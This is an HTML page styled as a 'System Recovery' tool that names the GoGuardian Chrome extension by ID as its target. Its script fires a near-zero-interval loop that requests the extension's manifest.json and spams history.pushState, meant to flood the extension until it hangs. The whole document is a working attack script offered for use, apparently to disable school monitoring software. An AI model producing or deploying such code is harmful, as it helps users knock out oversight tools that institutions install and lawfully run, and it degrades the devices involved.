<!DOCTYPE html>
<html>
<head>
    <title>System Recovery</title>
    <style>
        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
        .status { font-size: 24px; margin-bottom: 20px; }
        #kill-btn { background: #ff0000; color: #000; padding: 20px; border: none; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="status">TARGET: GoGuardian (haldlgldplgnggkjaafhelgiaglafanh)</div>
    <button id="kill-btn">INITIATE HANG SEQUENCE</button>
    <div id="logs" style="margin-top: 20px; color: #555;"></div>

    <script>
        document.getElementById('kill-btn').onclick = function() {
            const targetID = 'haldlgldplgnggkjaafhelgiaglafanh';
            const logs = document.getElementById('logs');
            logs.innerHTML = "Attempting to flood extension origin...";

            // Method: Attempting to open multiple filtered resource hits 
            // to overwhelm the extension's content-checking engine.
            setInterval(() => {
                const img = new Image();
                // We point to a resource the extension has to intercept/check
                img.src = `chrome-extension://${targetID}/manifest.json?t=${Math.random()}`;
                
                // We also spam history states to trigger the 'onHistoryStateUpdated' listener
                window.history.pushState({}, '', `#${Math.random()}`);
            }, 0.1); 

            logs.innerHTML += "<br>Flooding active. Extension may hang or lag.";
        };
    </script>
</body>
</html>
